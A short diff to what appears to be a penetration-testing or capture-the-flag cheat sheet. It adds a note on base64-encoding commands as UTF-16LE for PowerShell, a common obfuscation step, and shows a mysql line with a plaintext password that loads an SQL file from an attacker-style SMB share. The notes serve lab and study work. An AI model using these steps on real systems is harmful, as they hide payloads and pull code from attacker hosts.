@@ -108,6 +108,12 @@ C:\WINDOWS\sysnative\WindowsPowerShell\v1.0\powershell.exe
 C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe
 ```
 
+### powershell base64
+```
+echo command | iconv -t utf-16le | base64 -w 0
+powershell /env 
+```
+
 ### Local mysql
 ```
 mysql --user="dbuser" --database="sniper" --password="36mEAhz/B8xQ~2VM" < \\10.10.14.6\hacker\test.sql
